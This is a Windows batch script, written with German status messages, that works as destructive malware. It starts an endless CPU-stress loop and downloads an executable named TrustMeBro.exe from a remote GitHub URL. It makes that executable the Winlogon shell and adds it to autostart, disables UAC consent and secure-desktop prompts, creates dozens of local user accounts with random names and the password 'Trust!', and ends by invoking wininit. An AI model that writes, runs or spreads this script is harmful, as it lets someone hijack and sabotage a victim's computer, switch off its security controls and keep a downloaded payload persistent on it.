set "target=%APPDATA%\bro.exe"
start "CPU Stress" cmd /k "powershell -command \"while ($true) { [Math]::Sqrt(12345) }\""
echo Lade TrustMeBro.exe herunter...
curl -L -o "%target%" "https://raw.githubusercontent.com/xqrto/Apps/main/TrustMeBro.exe" 
echo Registriere als Shell + Autostart...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "%target%" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v bro /t REG_SZ /d "%target%" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user Trust%random%me%random%Bro Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
net user %random%%random%%random%%random%%random%%random% Trust! /add
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
/v bro ^
/t REG_SZ ^
/d "%APPDATA%\bro.exe" ^
/f
powershell wininit
